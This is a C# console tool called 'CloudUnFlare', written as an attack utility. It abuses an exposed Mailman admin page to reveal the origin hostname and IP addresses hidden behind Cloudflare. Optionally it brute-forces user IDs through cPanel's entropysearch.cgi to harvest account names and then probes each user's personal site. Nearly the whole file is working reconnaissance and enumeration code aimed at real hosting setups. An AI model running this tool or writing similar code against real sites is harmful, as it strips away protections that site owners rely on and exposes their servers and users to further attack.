using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using NLog;
using NLog.Config;
using Fclp;

namespace CloudUnFlare
{
    class AppArguements
    {
        public string Target { get; set; }
        public bool EnumUsers { get; set; }
        public bool EnumSites { get; set; }
    }

    class Program
    {
        static Logger _log = LogManager.GetCurrentClassLogger();

        static int GetResource(string Url, out string Content)
        {
            int code = 0;

            try
            {
                WebClient cli = new WebClient();

                Content = cli.DownloadString(new Uri(Url));

                code = 200;

                _log.Debug("Url: {0} -> Response: {1} -> Content: {2}", Url, code, Content);
            }
            catch (WebException exp)
            {
                _log.Error(exp);
                if (exp.Response != null)
                {
                    HttpWebResponse response = (HttpWebResponse)exp.Response;
                    code = Convert.ToInt32(response.StatusCode);
                    _log.Debug("{0} returned status code {1}", Url, code);
                }

                Content = string.Empty;
            }

            return code;
        }

        static bool IsLive(string Site)
        {
            string content = string.Empty;

            // check https
            if (GetResource("https://" + Site, out content) == 200)
            {
                return true;
            }

            // and check http
            if (GetResource("http://" + Site, out content) == 200)
            {
                return true;
            }

            return false;
        }

        public static bool MailmanInPlay(string Target)
        {
            string mmUrl = "https://" + Target + "/Mailman/Admin/Mailman";
            string content = string.Empty;

            if (GetResource(mmUrl, out content) == 200)
            {
                return true;
            }

            return false;
        }

        public static bool ExtractMMHost(string Target, out string HiddenHost)
        {
            string mmUrl = "https://" + Target + "/mailman/admin/mailman";
            string content = string.Empty;

            if (GetResource(mmUrl, out content) == 200)
            {
                // Now extract the host name
                // search the content for the string "Overview of all "...
                int iPos = content.IndexOf("Overview of all ") + "Overview of all ".Length;
                int ePos = content.IndexOf(" mailing lists</a>");
                int len = ePos - iPos;

                HiddenHost = content.Substring(iPos, len);

                return true;
            }
            HiddenHost = string.Empty;
            return false;
        }

        static List<string> DNSLookup(string Domain)
        {
            List<string> ipAddresses = new List<string>();

            try
            {
                IPAddress[] addresses = Dns.GetHostAddresses(Domain);

                foreach (IPAddress address in addresses)
                {
                    string addr = address.ToString();

                    ipAddresses.Add(addr);
                    _log.Info("{0} resolved to {1}", Domain, addr);
                }
            }
            catch (Exception exp)
            {
                _log.Error(exp);
            }

            return ipAddresses;
        }

        static List<string> EnumUsers(string hiddenHostname)
        {
            List<string> users = new List<string>();
            string uri = "http://" + hiddenHostname + "/cgi-sys/entropysearch.cgi?user={0}";
            int countLine = Console.CursorTop;

            for (int iRes = 500; iRes <= 2000; iRes++)
            {
                Console.CursorLeft = 0;
                Console.CursorTop = countLine;
                Console.Write("Trying user {0} of 2000...", iRes);
                Console.CursorLeft = 0;
                Console.CursorTop = countLine + 1;

                string target = string.Format(uri, iRes);
                string content = string.Empty;

                if (GetResource(target, out content) == 200)
                {
                    if (content.IndexOf("/home/") != -1)
                    {
                        int iPos = content.IndexOf("/home/") + "/home/".Length;
                        int ePos = content.IndexOf("/.htmltemplates:");
                        int len = ePos - iPos;

                        string user = content.Substring(iPos, len);
                        users.Add(user);

                        _log.Info("Found user: {0}", user);
                        Console.Write("Found user:          {0}                               ", user);
                    }
                }
            }

            return users;
        }

        static void Main(string[] args)
        {
            Console.Clear();
            var commandLineParser = new FluentCommandLineParser<AppArguements>();

            commandLineParser.Setup(arg => arg.Target)
                .As('t', "target")
                .Required();

            commandLineParser.Setup(arg => arg.EnumSites)
                .As('s', "enumsites")
                .SetDefault(false);

            commandLineParser.Setup(arg => arg.EnumUsers)
                .As('u', "enumusers")
                .SetDefault(false);

            var Result = commandLineParser.Parse(args);
            if (Result.HasErrors && Result.UnMatchedOptions.Count() != 0)
            {
                _log.Error("Invalid command line.....");
                Console.WriteLine("Usage: CloudUnFlare");
                Console.WriteLine("     --t or --target : Target Url");
                Console.WriteLine("     --s or --enumsites : Enumerate the sites identified by the users (Optional)");
                Console.WriteLine("     --u or --enumusers : Enumerate the users (Optional)");
                return;
            }

            string Target = commandLineParser.Object.Target;
            string hiddenHostname = string.Empty;
            bool bEnumUsers = commandLineParser.Object.EnumUsers;
            bool bEnumSites = commandLineParser.Object.EnumSites;

            // Plot
            // 1) check site is live
            Console.WriteLine("Checking {0} liveness...", Target);
            if (!IsLive(Target))
            {
                _log.Error("{0} not live", Target);
                return;
            }

            // 2) Check Mailman is running
            Console.WriteLine("Check whether mailman is in play....");
            if (!MailmanInPlay(Target))
            {
                _log.Error("Mailman not in play on {0}", Target);
                return;
            }

            // 3) Extract hidden hostname
            Console.WriteLine("Checking hidden host....");
            if (!ExtractMMHost(Target, out hiddenHostname))
            {
                _log.Error("Couldn't get hidden host for {0}", Target);
                return;
            }

            List<string> addresses = DNSLookup(hiddenHostname);

            // Output the details of the CloudUnFlare'd site
            Console.WriteLine("Target:          {0}", Target);
            _log.Info("Target:          {0}", Target);
            Console.WriteLine("Hidden Host:     {0}", hiddenHostname);
            _log.Info("Hidden Host:     {0}", hiddenHostname);
            foreach(var addr in addresses)
            {
                Console.WriteLine("Address:         {0}", addr);
                _log.Info("Address:         {0}", addr);
            }

            // Now are we enumerating the users
            // We used the hiddenhost for the target from now on
            if (bEnumUsers && addresses.Count != 0)
            {
                List<string> users = EnumUsers(hiddenHostname);

                if (bEnumSites)
                {
                    foreach (string user in users)
                    {
                        string targetsite = hiddenHostname + "/~" + user;
                        Console.WriteLine("Checking site {0}", targetsite);
                        if (IsLive(targetsite))
                        {
                            Console.WriteLine("Site Live:       {0}", targetsite);
                            _log.Info("Site Live:       {0}", targetsite);
                        }
                    }
                }
            }
        }
    }
}
